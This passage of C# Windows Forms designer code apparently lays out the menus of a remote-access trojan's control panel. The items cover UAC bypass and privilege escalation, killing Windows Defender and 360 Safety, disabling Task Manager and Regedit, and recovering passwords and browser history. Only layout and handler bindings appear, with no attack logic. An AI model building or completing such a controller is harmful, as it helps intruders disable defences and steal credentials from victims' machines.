			this.directUacToolStripMenuItem.Text = "Direct Uac";
			this.directUacToolStripMenuItem.Visible = false;
			this.windows10ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.windows10ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.windows10ToolStripMenuItem.Name = "windows10ToolStripMenuItem";
			this.windows10ToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.windows10ToolStripMenuItem.Text = "Windows 10";
			this.windows10ToolStripMenuItem.Click += new System.EventHandler(windows10ToolStripMenuItem_Click);
			this.windows8ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.windows8ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.windows8ToolStripMenuItem.Name = "windows8ToolStripMenuItem";
			this.windows8ToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.windows8ToolStripMenuItem.Text = "Windows 8";
			this.windows8ToolStripMenuItem.Click += new System.EventHandler(windows8ToolStripMenuItem_Click);
			this.windows7ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.windows7ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.windows7ToolStripMenuItem.Name = "windows7ToolStripMenuItem";
			this.windows7ToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.windows7ToolStripMenuItem.Text = "Windows 7";
			this.windows7ToolStripMenuItem.Click += new System.EventHandler(windows7ToolStripMenuItem_Click);
			this.privilegeEscalationToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.privilegeEscalationToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.privilegeEscalationToolStripMenuItem1.Name = "privilegeEscalationToolStripMenuItem1";
			this.privilegeEscalationToolStripMenuItem1.Size = new System.Drawing.Size(301, 22);
			this.privilegeEscalationToolStripMenuItem1.Text = "Privilege Escalation";
			this.privilegeEscalationToolStripMenuItem1.Click += new System.EventHandler(privilegeEscalationToolStripMenuItem_Click);
			this.getAdminToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.getAdminToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.getAdminToolStripMenuItem.Name = "getAdminToolStripMenuItem";
			this.getAdminToolStripMenuItem.Size = new System.Drawing.Size(301, 22);
			this.getAdminToolStripMenuItem.Text = "Get Admin";
			this.getAdminToolStripMenuItem.Visible = false;
			this.getAdminToolStripMenuItem.Click += new System.EventHandler(adminpermissionsToolStripMenuItem_Click);
			this.uploadPluginToolStripMenuItem7.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem7.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem7.Name = "uploadPluginToolStripMenuItem7";
			this.uploadPluginToolStripMenuItem7.Size = new System.Drawing.Size(301, 22);
			this.uploadPluginToolStripMenuItem7.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem7.Visible = false;
			this.uploadPluginToolStripMenuItem7.Click += new System.EventHandler(escalationPluginToolStripMenuItem_Click);
			this.activateUACPluginToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.activateUACPluginToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.activateUACPluginToolStripMenuItem.Name = "activateUACPluginToolStripMenuItem";
			this.activateUACPluginToolStripMenuItem.Size = new System.Drawing.Size(301, 22);
			this.activateUACPluginToolStripMenuItem.Text = "Inject UAC Plugin(For direct admin)";
			this.activateUACPluginToolStripMenuItem.Visible = false;
			this.activateUACPluginToolStripMenuItem.Click += new System.EventHandler(activateUACPluginToolStripMenuItem_Click);
			this.activateOtherPluginToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.activateOtherPluginToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.activateOtherPluginToolStripMenuItem.Name = "activateOtherPluginToolStripMenuItem";
			this.activateOtherPluginToolStripMenuItem.Size = new System.Drawing.Size(301, 22);
			this.activateOtherPluginToolStripMenuItem.Text = "Activate Other Plugin";
			this.activateOtherPluginToolStripMenuItem.Visible = false;
			this.activateOtherPluginToolStripMenuItem.Click += new System.EventHandler(activateOtherPluginToolStripMenuItem_Click);
			this.startUpManagerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.startupManagerToolStripMenuItem1, this.uploadPluginToolStripMenuItem8 });
			this.startUpManagerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.startUpManagerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("startUpManagerToolStripMenuItem.Image");
			this.startUpManagerToolStripMenuItem.Name = "startUpManagerToolStripMenuItem";
			this.startUpManagerToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.startUpManagerToolStripMenuItem.Text = "StartUp Manager";
			this.startupManagerToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.startupManagerToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.startupManagerToolStripMenuItem1.Name = "startupManagerToolStripMenuItem1";
			this.startupManagerToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
			this.startupManagerToolStripMenuItem1.Text = "Startup Manager";
			this.startupManagerToolStripMenuItem1.Click += new System.EventHandler(remoteStartupToolStripMenuItem_Click);
			this.uploadPluginToolStripMenuItem8.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem8.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem8.Name = "uploadPluginToolStripMenuItem8";
			this.uploadPluginToolStripMenuItem8.Size = new System.Drawing.Size(184, 22);
			this.uploadPluginToolStripMenuItem8.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem8.Visible = false;
			this.uploadPluginToolStripMenuItem8.Click += new System.EventHandler(pluginRemoteStartupToolStripMenuItem_Click);
			this.extraToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.killWDToolStripMenuItem, this.kill360SafetyToolStripMenuItem, this.uploadPluginToolStripMenuItem11 });
			this.extraToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.extraToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("extraToolStripMenuItem.Image");
			this.extraToolStripMenuItem.Name = "extraToolStripMenuItem";
			this.extraToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.extraToolStripMenuItem.Text = "Anti/Windows Defender";
			this.killWDToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.killWDToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.killWDToolStripMenuItem.Name = "killWDToolStripMenuItem";
			this.killWDToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
			this.killWDToolStripMenuItem.Text = "Kill WD(Admin)";
			this.killWDToolStripMenuItem.Click += new System.EventHandler(killWDToolStripMenuItem_Click);
			this.kill360SafetyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.kill360SafetyToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.kill360SafetyToolStripMenuItem.Name = "kill360SafetyToolStripMenuItem";
			this.kill360SafetyToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
			this.kill360SafetyToolStripMenuItem.Text = "Kill360 Safety";
			this.kill360SafetyToolStripMenuItem.Visible = false;
			this.kill360SafetyToolStripMenuItem.Click += new System.EventHandler(close360ToolStripMenuItem_Click);
			this.uploadPluginToolStripMenuItem11.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem11.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem11.Name = "uploadPluginToolStripMenuItem11";
			this.uploadPluginToolStripMenuItem11.Size = new System.Drawing.Size(180, 22);
			this.uploadPluginToolStripMenuItem11.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem11.Visible = false;
			this.uploadPluginToolStripMenuItem11.Click += new System.EventHandler(TcpToGui_Click);
			this.remoteFunToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[13]
			{
				this.monitorOnoffToolStripMenuItem, this.openCloseCdToolStripMenuItem, this.showHideTaskbarToolStripMenuItem, this.showHideStartBtnToolStripMenuItem, this.startStopExplorerToolStripMenuItem, this.showHideClockToolStripMenuItem, this.showHideTrayToolStripMenuItem, this.showHideDesktopIconsToolStripMenuItem, this.hideRestoreAllWindowsToolStripMenuItem, this.enableDisableTaskmgrToolStripMenuItem,
				this.enableDisableRegeditToolStripMenuItem, this.showHideMouseToolStripMenuItem, this.disableuacToolStripMenuItem
			});
			this.remoteFunToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteFunToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("remoteFunToolStripMenuItem.Image");
			this.remoteFunToolStripMenuItem.Name = "remoteFunToolStripMenuItem";
			this.remoteFunToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.remoteFunToolStripMenuItem.Text = "Remote Fun";
			this.remoteFunToolStripMenuItem.Visible = false;
			this.monitorOnoffToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.monitorOnoffToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.onToolStripMenuItem, this.offToolStripMenuItem });
			this.monitorOnoffToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.monitorOnoffToolStripMenuItem.Name = "monitorOnoffToolStripMenuItem";
			this.monitorOnoffToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.monitorOnoffToolStripMenuItem.Text = "Monitor on/off";
			this.onToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.onToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.onToolStripMenuItem.Name = "onToolStripMenuItem";
			this.onToolStripMenuItem.Size = new System.Drawing.Size(95, 22);
			this.onToolStripMenuItem.Text = "On";
			this.onToolStripMenuItem.Click += new System.EventHandler(onToolStripMenuItem_Click);
			this.offToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.offToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.offToolStripMenuItem.Name = "offToolStripMenuItem";
			this.offToolStripMenuItem.Size = new System.Drawing.Size(95, 22);
			this.offToolStripMenuItem.Text = "Off";
			this.offToolStripMenuItem.Click += new System.EventHandler(offToolStripMenuItem_Click);
			this.openCloseCdToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.openCloseCdToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.openToolStripMenuItem, this.closeToolStripMenuItem });
			this.openCloseCdToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.openCloseCdToolStripMenuItem.Name = "openCloseCdToolStripMenuItem";
			this.openCloseCdToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.openCloseCdToolStripMenuItem.Text = "Open/Close Cd";
			this.openToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.openToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.openToolStripMenuItem.Name = "openToolStripMenuItem";
			this.openToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
			this.openToolStripMenuItem.Text = "Open";
			this.openToolStripMenuItem.Click += new System.EventHandler(openToolStripMenuItem_Click);
			this.closeToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.closeToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
			this.closeToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
			this.closeToolStripMenuItem.Text = "Close";
			this.closeToolStripMenuItem.Click += new System.EventHandler(closeToolStripMenuItem_Click);
			this.showHideTaskbarToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showHideTaskbarToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.showToolStripMenuItem, this.hideToolStripMenuItem });
			this.showHideTaskbarToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.showHideTaskbarToolStripMenuItem.Name = "showHideTaskbarToolStripMenuItem";
			this.showHideTaskbarToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.showHideTaskbarToolStripMenuItem.Text = "Show/Hide Taskbar";
			this.showToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.showToolStripMenuItem.Name = "showToolStripMenuItem";
			this.showToolStripMenuItem.Size = new System.Drawing.Size(111, 22);
			this.showToolStripMenuItem.Text = "Show";
			this.showToolStripMenuItem.Click += new System.EventHandler(showToolStripMenuItem_Click);
			this.hideToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.hideToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.hideToolStripMenuItem.Name = "hideToolStripMenuItem";
			this.hideToolStripMenuItem.Size = new System.Drawing.Size(111, 22);
			this.hideToolStripMenuItem.Text = "Hide";
			this.hideToolStripMenuItem.Click += new System.EventHandler(hideToolStripMenuItem_Click);
			this.showHideStartBtnToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showHideStartBtnToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.showToolStripMenuItem1, this.hideToolStripMenuItem1 });
			this.showHideStartBtnToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.showHideStartBtnToolStripMenuItem.Name = "showHideStartBtnToolStripMenuItem";
			this.showHideStartBtnToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.showHideStartBtnToolStripMenuItem.Text = "Show/Hide Start Btn";
			this.showToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.showToolStripMenuItem1.Name = "showToolStripMenuItem1";
			this.showToolStripMenuItem1.Size = new System.Drawing.Size(111, 22);
			this.showToolStripMenuItem1.Text = "Show";
			this.showToolStripMenuItem1.Click += new System.EventHandler(showToolStripMenuItem1_Click);
			this.hideToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.hideToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.hideToolStripMenuItem1.Name = "hideToolStripMenuItem1";
			this.hideToolStripMenuItem1.Size = new System.Drawing.Size(111, 22);
			this.hideToolStripMenuItem1.Text = "Hide";
			this.hideToolStripMenuItem1.Click += new System.EventHandler(hideToolStripMenuItem1_Click);
			this.startStopExplorerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.startStopExplorerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.startToolStripMenuItem, this.stopToolStripMenuItem });
			this.startStopExplorerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.startStopExplorerToolStripMenuItem.Name = "startStopExplorerToolStripMenuItem";
			this.startStopExplorerToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.startStopExplorerToolStripMenuItem.Text = "Start/Stop Explorer";
			this.startToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.startToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.startToolStripMenuItem.Name = "startToolStripMenuItem";
			this.startToolStripMenuItem.Size = new System.Drawing.Size(105, 22);
			this.startToolStripMenuItem.Text = "Start";
			this.startToolStripMenuItem.Click += new System.EventHandler(startToolStripMenuItem_Click);
			this.stopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.stopToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
			this.stopToolStripMenuItem.Size = new System.Drawing.Size(105, 22);
			this.stopToolStripMenuItem.Text = "Stop";
			this.stopToolStripMenuItem.Click += new System.EventHandler(stopToolStripMenuItem_Click);
			this.showHideClockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showHideClockToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.showToolStripMenuItem2, this.hideToolStripMenuItem2 });
			this.showHideClockToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.showHideClockToolStripMenuItem.Name = "showHideClockToolStripMenuItem";
			this.showHideClockToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.showHideClockToolStripMenuItem.Text = "Show/Hide  Clock";
			this.showToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showToolStripMenuItem2.ForeColor = System.Drawing.Color.White;
			this.showToolStripMenuItem2.Name = "showToolStripMenuItem2";
			this.showToolStripMenuItem2.Size = new System.Drawing.Size(111, 22);
			this.showToolStripMenuItem2.Text = "Show";
			this.showToolStripMenuItem2.Click += new System.EventHandler(showToolStripMenuItem2_Click);
			this.hideToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.hideToolStripMenuItem2.ForeColor = System.Drawing.Color.White;
			this.hideToolStripMenuItem2.Name = "hideToolStripMenuItem2";
			this.hideToolStripMenuItem2.Size = new System.Drawing.Size(111, 22);
			this.hideToolStripMenuItem2.Text = "Hide";
			this.hideToolStripMenuItem2.Click += new System.EventHandler(hideToolStripMenuItem2_Click);
			this.showHideTrayToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showHideTrayToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.showToolStripMenuItem3, this.hideToolStripMenuItem3 });
			this.showHideTrayToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.showHideTrayToolStripMenuItem.Name = "showHideTrayToolStripMenuItem";
			this.showHideTrayToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.showHideTrayToolStripMenuItem.Text = "Show/Hide  Tray";
			this.showToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showToolStripMenuItem3.ForeColor = System.Drawing.Color.White;
			this.showToolStripMenuItem3.Name = "showToolStripMenuItem3";
			this.showToolStripMenuItem3.Size = new System.Drawing.Size(111, 22);
			this.showToolStripMenuItem3.Text = "Show";
			this.showToolStripMenuItem3.Click += new System.EventHandler(showToolStripMenuItem3_Click);
			this.hideToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.hideToolStripMenuItem3.ForeColor = System.Drawing.Color.White;
			this.hideToolStripMenuItem3.Name = "hideToolStripMenuItem3";
			this.hideToolStripMenuItem3.Size = new System.Drawing.Size(111, 22);
			this.hideToolStripMenuItem3.Text = "Hide";
			this.hideToolStripMenuItem3.Click += new System.EventHandler(hideToolStripMenuItem3_Click);
			this.showHideDesktopIconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showHideDesktopIconsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem1, this.toolStripMenuItem2 });
			this.showHideDesktopIconsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.showHideDesktopIconsToolStripMenuItem.Name = "showHideDesktopIconsToolStripMenuItem";
			this.showHideDesktopIconsToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.showHideDesktopIconsToolStripMenuItem.Text = "Show/Hide  Desktop Icons";
			this.toolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.toolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem1.Name = "toolStripMenuItem1";
			this.toolStripMenuItem1.Size = new System.Drawing.Size(111, 22);
			this.toolStripMenuItem1.Text = "Hide";
			this.toolStripMenuItem1.Click += new System.EventHandler(toolStripMenuItem1_Click);
			this.toolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.toolStripMenuItem2.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem2.Name = "toolStripMenuItem2";
			this.toolStripMenuItem2.Size = new System.Drawing.Size(111, 22);
			this.toolStripMenuItem2.Text = "Show";
			this.toolStripMenuItem2.Click += new System.EventHandler(toolStripMenuItem2_Click);
			this.hideRestoreAllWindowsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.hideRestoreAllWindowsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.restoreToolStripMenuItem, this.hideToolStripMenuItem4 });
			this.hideRestoreAllWindowsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.hideRestoreAllWindowsToolStripMenuItem.Name = "hideRestoreAllWindowsToolStripMenuItem";
			this.hideRestoreAllWindowsToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.hideRestoreAllWindowsToolStripMenuItem.Text = "Hide/Restore All Windows";
			this.restoreToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.restoreToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.restoreToolStripMenuItem.Name = "restoreToolStripMenuItem";
			this.restoreToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
			this.restoreToolStripMenuItem.Text = "Restore";
			this.restoreToolStripMenuItem.Visible = false;
			this.restoreToolStripMenuItem.Click += new System.EventHandler(restoreToolStripMenuItem_Click);
			this.hideToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.hideToolStripMenuItem4.ForeColor = System.Drawing.Color.White;
			this.hideToolStripMenuItem4.Name = "hideToolStripMenuItem4";
			this.hideToolStripMenuItem4.Size = new System.Drawing.Size(123, 22);
			this.hideToolStripMenuItem4.Text = "Hide";
			this.hideToolStripMenuItem4.Click += new System.EventHandler(hideToolStripMenuItem4_Click);
			this.enableDisableTaskmgrToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.enableDisableTaskmgrToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.enableToolStripMenuItem, this.disableToolStripMenuItem });
			this.enableDisableTaskmgrToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.enableDisableTaskmgrToolStripMenuItem.Name = "enableDisableTaskmgrToolStripMenuItem";
			this.enableDisableTaskmgrToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.enableDisableTaskmgrToolStripMenuItem.Text = "Enable/Disable Taskmgr";
			this.enableToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.enableToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.enableToolStripMenuItem.Name = "enableToolStripMenuItem";
			this.enableToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
			this.enableToolStripMenuItem.Text = "Enable";
			this.enableToolStripMenuItem.Click += new System.EventHandler(enableToolStripMenuItem_Click);
			this.disableToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.disableToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.disableToolStripMenuItem.Name = "disableToolStripMenuItem";
			this.disableToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
			this.disableToolStripMenuItem.Text = "Disable";
			this.disableToolStripMenuItem.Click += new System.EventHandler(disableToolStripMenuItem_Click);
			this.enableDisableRegeditToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.enableDisableRegeditToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.enableToolStripMenuItem1, this.disableToolStripMenuItem1 });
			this.enableDisableRegeditToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.enableDisableRegeditToolStripMenuItem.Name = "enableDisableRegeditToolStripMenuItem";
			this.enableDisableRegeditToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.enableDisableRegeditToolStripMenuItem.Text = "Enable/Disable Regedit";
			this.enableToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.enableToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.enableToolStripMenuItem1.Name = "enableToolStripMenuItem1";
			this.enableToolStripMenuItem1.Size = new System.Drawing.Size(123, 22);
			this.enableToolStripMenuItem1.Text = "Enable";
			this.enableToolStripMenuItem1.Click += new System.EventHandler(enableToolStripMenuItem1_Click);
			this.disableToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.disableToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.disableToolStripMenuItem1.Name = "disableToolStripMenuItem1";
			this.disableToolStripMenuItem1.Size = new System.Drawing.Size(123, 22);
			this.disableToolStripMenuItem1.Text = "Disable";
			this.disableToolStripMenuItem1.Click += new System.EventHandler(disableToolStripMenuItem1_Click);
			this.showHideMouseToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.showHideMouseToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem3, this.toolStripMenuItem4 });
			this.showHideMouseToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.showHideMouseToolStripMenuItem.Name = "showHideMouseToolStripMenuItem";
			this.showHideMouseToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.showHideMouseToolStripMenuItem.Text = "Show/Hide  Mouse";
			this.toolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.toolStripMenuItem3.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem3.Name = "toolStripMenuItem3";
			this.toolStripMenuItem3.Size = new System.Drawing.Size(111, 22);
			this.toolStripMenuItem3.Text = "Hide";
			this.toolStripMenuItem3.Click += new System.EventHandler(toolStripMenuItem3_Click);
			this.toolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.toolStripMenuItem4.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem4.Name = "toolStripMenuItem4";
			this.toolStripMenuItem4.Size = new System.Drawing.Size(111, 22);
			this.toolStripMenuItem4.Text = "Show";
			this.toolStripMenuItem4.Click += new System.EventHandler(toolStripMenuItem4_Click);
			this.disableuacToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.disableuacToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem5, this.toolStripMenuItem6 });
			this.disableuacToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.disableuacToolStripMenuItem.Name = "disableuacToolStripMenuItem";
			this.disableuacToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
			this.disableuacToolStripMenuItem.Text = "Disableuac";
			this.toolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.toolStripMenuItem5.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem5.Name = "toolStripMenuItem5";
			this.toolStripMenuItem5.Size = new System.Drawing.Size(123, 22);
			this.toolStripMenuItem5.Text = "Enable";
			this.toolStripMenuItem5.Click += new System.EventHandler(toolStripMenuItem5_Click);
			this.toolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.toolStripMenuItem6.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem6.Name = "toolStripMenuItem6";
			this.toolStripMenuItem6.Size = new System.Drawing.Size(123, 22);
			this.toolStripMenuItem6.Text = "Disable";
			this.toolStripMenuItem6.Click += new System.EventHandler(toolStripMenuItem6_Click);
			this.passwordRecoveryToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.webHistoryToolStripMenuItem, this.webHistoryAllToolStripMenuItem, this.getLogsLinkToolStripMenuItem, this.activateSTPluginToolStripMenuItem });
			this.passwordRecoveryToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.passwordRecoveryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("passwordRecoveryToolStripMenuItem.Image");
			this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
			this.passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
			this.passwordRecoveryToolStripMenuItem.Visible = false;
			this.webHistoryToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.webHistoryToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.webHistoryToolStripMenuItem.Name = "webHistoryToolStripMenuItem";
			this.webHistoryToolStripMenuItem.Size = new System.Drawing.Size(209, 22);
			this.webHistoryToolStripMenuItem.Text = "Web History(Chome)";
			this.webHistoryToolStripMenuItem.Click += new System.EventHandler(webRecoveryToolStripMenuItem_Click);
			this.webHistoryAllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.webHistoryAllToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.webHistoryAllToolStripMenuItem.Name = "webHistoryAllToolStripMenuItem";
			this.webHistoryAllToolStripMenuItem.Size = new System.Drawing.Size(209, 22);
			this.webHistoryAllToolStripMenuItem.Text = "Web History(All)";
			this.webHistoryAllToolStripMenuItem.Click += new System.EventHandler(webHistoryAllToolStripMenuItem_Click);
			this.getLogsLinkToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.getLogsLinkToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.getLogsLinkToolStripMenuItem.Name = "getLogsLinkToolStripMenuItem";
			this.getLogsLinkToolStripMenuItem.Size = new System.Drawing.Size(209, 22);
